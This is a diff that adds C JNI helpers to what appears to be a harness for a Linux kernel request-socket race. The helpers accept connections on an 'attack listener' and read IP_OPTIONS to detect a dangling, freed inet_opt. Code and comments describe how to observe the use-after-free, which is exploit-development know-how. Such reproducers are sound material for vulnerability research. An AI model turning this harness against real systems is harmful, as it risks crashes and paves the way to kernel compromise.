@@ -579,6 +579,59 @@ Java_com_inj_Native_raceStop(JNIEnv *env, jclass cls)
     g_race_started = 0;
 }
 
+// Accept one connection on an already listening fd.
+//
+// Needed because the attack listener is created here and never handed to a
+// java.net.ServerSocket, so nothing in the Java layer can accept on it. Without
+// an accept loop the children pile up until the queue is full and later SYNs
+// are dropped - and, more importantly, the accepted child is exactly where a
+// dangling inet_opt would be observable.
+JNIEXPORT jint JNICALL
+Java_com_inj_Native_acceptFd(JNIEnv *env, jclass cls, jint fd)
+{
+    (void)env;
+    (void)cls;
+
+    int conn = accept(fd, NULL, NULL);
+    if (conn < 0) {
+        return -errno;
+    }
+    return conn;
+}
+
+// Read IP_OPTIONS from a socket and report what came back.
+//
+// If the request-socket race fired, the winning child inherited an
+// ip_options_rcu that the losing child already freed. inet_opt then points at
+// freed memory, so this call reads whatever the slab holds now: it may come
+// back with another object's bytes, with an optlen that is no longer 40, or it
+// may smash this thread's stack because getsockopt trusts that optlen.
+//
+// A clean child always reports len=40 and the option bytes the SYN carried.
+JNIEXPORT jstring JNICALL
+Java_com_inj_Native_readFdOptions(JNIEnv *env, jclass cls, jint fd)
+{
+    unsigned char buf[512];
+    socklen_t len = sizeof(buf);
+    char out[256];
+    int i, n = 0;
+
+    (void)cls;
+
+    memset(buf, 0, sizeof(buf));
+
+    if (getsockopt(fd, IPPROTO_IP, IP_OPTIONS, buf, &len) < 0) {
+        snprintf(out, sizeof(out), "none errno=%d", errno);
+        return (*env)->NewStringUTF(env, out);
+    }
+
+    n = snprintf(out, sizeof(out), "len=%d head=", (int)len);
+    for (i = 0; i < 16 && i < (int)len && n < (int)sizeof(out) - 4; i++) {
+        n += snprintf(out + n, sizeof(out) - n, "%02x", buf[i]);
+    }
+    return (*env)->NewStringUTF(env, out);
+}
+
 JNIEXPORT jint JNICALL
 Java_com_inj_Native_closeFd(JNIEnv *env, jclass cls, jint fd)
 {
